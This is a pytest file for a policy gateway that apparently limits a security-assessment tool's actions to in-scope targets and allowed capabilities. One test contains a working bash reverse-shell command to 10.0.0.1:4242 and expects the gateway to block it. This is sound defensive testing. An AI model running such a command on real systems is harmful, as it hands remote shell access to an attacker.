import pytest
import uuid
from app.policy.gateway import PolicyGateway
from app.schemas.policy import PolicyAction, PolicyDecisionResult, ActionCapability
from app.models.models import Assessment


@pytest.fixture
def gateway():
    return PolicyGateway()


@pytest.fixture
def assessment():
    a = Assessment(
        id=str(uuid.uuid4()),
        name="Test Assessment",
        target="demo.local",
        status="RECON"
    )
    return a


def create_action(target="demo.local", capability="RECON", endpoint=None, parameters=None) -> PolicyAction:
    if parameters is None:
        parameters = {}
    return PolicyAction(
        action_id=str(uuid.uuid4()),
        assessment_id="test",
        target=target,
        action_type="test_action",
        capability=capability,
        endpoint=endpoint,
        parameters=parameters,
        requested_by="Test"
    )


def test_allowed_target_demo_local(gateway, assessment):
    action = create_action(target="demo.local")
    decision = gateway.evaluate(action, assessment)
    assert decision.decision == PolicyDecisionResult.ALLOW
    assert decision.reason_code == "ACTION_ALLOWED"


def test_allowed_target_localhost(gateway, assessment):
    assessment.target = "localhost"
    action = create_action(target="localhost")
    decision = gateway.evaluate(action, assessment)
    assert decision.decision == PolicyDecisionResult.ALLOW


def test_allowed_target_127_0_0_1(gateway, assessment):
    assessment.target = "127.0.0.1"
    action = create_action(target="127.0.0.1")
    decision = gateway.evaluate(action, assessment)
    assert decision.decision == PolicyDecisionResult.ALLOW


def test_unauthorized_target(gateway, assessment):
    assessment.target = "evil.com"
    action = create_action(target="evil.com")
    decision = gateway.evaluate(action, assessment)
    assert decision.decision == PolicyDecisionResult.BLOCK
    assert decision.reason_code == "TARGET_NOT_ALLOWED"


def test_missing_target(gateway, assessment):
    action = create_action(target="")
    decision = gateway.evaluate(action, assessment)
    assert decision.decision == PolicyDecisionResult.BLOCK
    assert decision.reason_code == "TARGET_MISSING"


def test_invalid_scope_target_mismatch(gateway, assessment):
    # Assessment is demo.local, but action tries localhost
    action = create_action(target="localhost")
    decision = gateway.evaluate(action, assessment)
    assert decision.decision == PolicyDecisionResult.BLOCK
    assert decision.reason_code == "TARGET_OUTSIDE_SCOPE"


def test_endpoint_outside_scope(gateway, assessment):
    action = create_action(target="demo.local", endpoint="http://evil.com/api")
    decision = gateway.evaluate(action, assessment)
    assert decision.decision == PolicyDecisionResult.BLOCK
    assert decision.reason_code == "ENDPOINT_OUTSIDE_SCOPE"


def test_allowed_capability(gateway, assessment):
    action = create_action(capability=ActionCapability.VALIDATION)
    decision = gateway.evaluate(action, assessment)
    assert decision.decision == PolicyDecisionResult.ALLOW


def test_unknown_capability(gateway, assessment):
    action = create_action(capability="ARBITRARY_EXECUTION")
    decision = gateway.evaluate(action, assessment)
    assert decision.decision == PolicyDecisionResult.BLOCK
    assert decision.reason_code == "CAPABILITY_NOT_ALLOWED"


def test_malformed_action_arbitrary_bash(gateway, assessment):
    action = create_action(parameters={"cmd": "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"})
    decision = gateway.evaluate(action, assessment)
    assert decision.decision == PolicyDecisionResult.BLOCK
    assert decision.reason_code == "ARBITRARY_EXECUTION_DETECTED"


def test_missing_assessment(gateway):
    action = create_action()
    decision = gateway.evaluate(action, None)
    assert decision.decision == PolicyDecisionResult.BLOCK
    assert decision.reason_code == "ASSESSMENT_NOT_FOUND"


def test_inactive_assessment(gateway, assessment):
    assessment.status = "COMPLETED"
    action = create_action()
    decision = gateway.evaluate(action, assessment)
    assert decision.decision == PolicyDecisionResult.BLOCK
    assert decision.reason_code == "ASSESSMENT_NOT_ACTIVE"
